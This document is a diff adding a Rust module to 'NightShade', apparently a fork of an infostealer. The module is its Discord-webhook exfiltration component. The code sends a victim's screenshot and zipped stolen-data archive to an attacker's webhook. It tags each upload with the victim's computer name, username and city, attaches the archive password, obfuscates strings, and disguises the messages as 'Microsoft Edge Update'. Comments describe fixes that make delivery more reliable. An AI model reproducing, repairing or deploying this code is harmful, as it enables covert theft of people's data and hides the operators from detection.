@@ -1,0 +1,248 @@
+/*
+ * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
+ *
+ * MIT License
+ *
+ * Copyright (c) 2025 sqlerrorthing
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in all
+ * copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+ * SOFTWARE.
+ */
+
+use crate::is_success_status;
+use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError, escape_json_string};
+use alloc::string::{String, ToString};
+use alloc::sync::Arc;
+use alloc::vec::Vec;
+use alloc::{format, vec};
+use collector::display::{CollectorBlock, CollectorDisplay};
+use collector::{Collector, Device};
+use core::fmt::Write;
+use core::fmt::{Display, Formatter};
+use derive_new::new;
+use indoc::{formatdoc, writedoc};
+use ipinfo::{IpInfo, unwrapped_ip_info};
+use obfstr::obfstr as s;
+use requests::{
+    BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder, write_file_field,
+    write_text_field,
+};
+use utils::pc_info::PcInfo;
+use utils::{format_size, internal_code_to_flag};
+
+/// A log sender that transmits data to a Discord channel using a webhook.
+///
+/// `DiscordWebhookSender` uses Discord's webhook API to send embedded messages
+/// and files such as screenshots or zipped logs. It supports formatting logs
+/// with rich embeds and fallbacks for size constraints.
+///
+/// # Fields
+///
+/// - `webhook`: The full Discord webhook URL, including the webhook ID and token.
+///
+/// # Notes
+///
+/// - Discord has a file upload limit of 8 MB per file.
+/// Discord's hard attachment limit for webhooks (non-boosted servers).
+const DISCORD_MAX_FILE_SIZE: usize = 8 * 1024 * 1024;
+
+#[derive(Clone, new, PartialEq, Eq)]
+pub struct DiscordWebhookSender {
+    #[new(into)]
+    pub webhook: Arc<str>,
+}
+
+struct DiscordEmbedFieldBlockDisplay<'a>(&'a CollectorBlock<'a>);
+
+impl Display for DiscordEmbedFieldBlockDisplay<'_> {
+    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
+        let mut body = String::new();
+
+        for field in self.0.fields.iter() {
+            writeln!(
+                body,
+                "> {} {}: **{}**",
+                field.emoji, field.name, field.value
+            )?;
+        }
+
+        body = body.trim_end_matches(['\r', '\n']).to_string();
+
+        writedoc!(
+            f,
+            r#"
+            {{
+                "name": "{emoji} {name}",
+                "value": "{body}",
+                "inline": true
+            }}
+            "#,
+            // Full JSON escaping: Windows paths are full of backslashes and
+            // the naive `\n`-only replacement used to emit invalid escape
+            // sequences (`\U`, `\D`...) that got the whole embed rejected.
+            emoji = escape_json_string(&self.0.emoji),
+            name = escape_json_string(&self.0.name),
+            body = escape_json_string(&body)
+        )
+    }
+}
+
+fn generate_embed<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> String
+where
+    P: AsRef<str>,
+    C: Collector,
+{
+    let PcInfo {
+        computer_name,
+        user_name,
+        product_name,
+    } = PcInfo::retrieve();
+    let IpInfo { country, city, .. } = unwrapped_ip_info();
+    let country_flag = internal_code_to_flag(&country)
+        .map(Arc::from)
+        .unwrap_or(country.clone());
+
+    let link = match log {
+        LogContent::ExternalLink(ExternalLink {
+            service_name,
+            link,
+            size,
+        }) => Some(format!(
+            r#"[Download]({link}) from {service_name} **{size}**"#,
+            size = format_size(*size as _)
+        )),
+        _ => None,
+    };
+
+    let password = password.map(|password| {
+        let password = password.as_ref();
+        format!(r#"Password: ||{password}||"#)
+    });
+
+    let mut parts = vec![
+        format!("✨ New log from {country_flag} **{city}**"),
+        format!("Victim: **{computer_name}**/**{user_name}** on **{product_name}**"),
+        "".to_string(),
+    ];
+    if let Some(l) = link {
+        parts.push(l);
+    }
+    if let Some(p) = password {
+        parts.push(p);
+    }
+    let description = if parts.is_empty() {
+        "".to_string()
+    } else {
+        parts.join("\n")
+    };
+
+    let fields = collector
+        .display_blocks()
+        .iter()
+        .map(DiscordEmbedFieldBlockDisplay)
+        .map(|x| x.to_string())
+        .collect::<Vec<_>>()
+        .join(", ");
+
+    formatdoc! {
+        r#"
+        {{
+          "description": "{description}",
+          "color": 14627378,
+          "fields": [
+            {fields}
+          ],
+          "author": {{
+            "name": "Microsoft Edge Update"
+          }},
+          "footer": {{
+            "text": "made with ❤️"
+          }}
+        }}"#,
+        description = escape_json_string(&description),
+    }
+}
+
+impl DiscordWebhookSender {
+    fn send_multipart(&self, builder: MultipartBuilder) -> Result<(), SendError> {
+        let content_type = builder.content_type();
+        let body = builder.finish();
+
+        let response = Request::post(self.webhook.to_string())
+            .header(s!("Content-Type"), &content_type)
+            .body(body)
+            .build()
+            .send()
+            .ok()
+            .ok_or(SendError::Network)?;
+
+        // Discord answers 200/204 on success; anything else (invalid webhook,
+        // 400 bad payload, 413 too large) is no longer a silent "success".
+        if !is_success_status(response.status_code()) {
+            return Err(SendError::Network);
+        }
+
+        Ok(())
+    }
+}
+
+impl LogSender for DiscordWebhookSender {
+    fn send<P, C>(
+        &self,
+        log_file: LogFile,
+        password: Option<P>,
+        collector: &C,
+    ) -> Result<(), SendError>
+    where
+        P: AsRef<str> + Clone,
+        C: Collector,
+    {
+        if let LogContent::ZipArchive(archive) = &log_file.content
+            && archive.len() > DISCORD_MAX_FILE_SIZE
+        {
+            return Err(SendError::LogFileTooBig);
+        }
+
+        if let Some(screenshot) = collector.get_device().get_screenshot() {
+            let mut builder = MultipartBuilder::new("----Multipart");
+            write_file_field!(builder, "file", "screenshot.png", "image/png", &screenshot);
+            write_text_field!(builder, "payload_json", r#"{"content": ""}"#);
+            self.send_multipart(builder)?;
+        }
+
+        let payload = formatdoc! {
+            r#"{{
+                "content": "",
+                "embeds": [
+                    {embed}
+                ]
+            }}"#,
+            embed = generate_embed(&log_file.content, password, collector),
+        };
+
+        let mut builder = MultipartBuilder::new("----Multipart");
+        if let LogContent::ZipArchive(archive) = log_file.content {
+            write_file_field!(builder, "file", &log_file.name => "application/zip", &archive);
+        }
+
+        write_text_field!(builder, "payload_json" => &payload);
+        self.send_multipart(builder)?;
+
+        Ok(())
+    }
+}
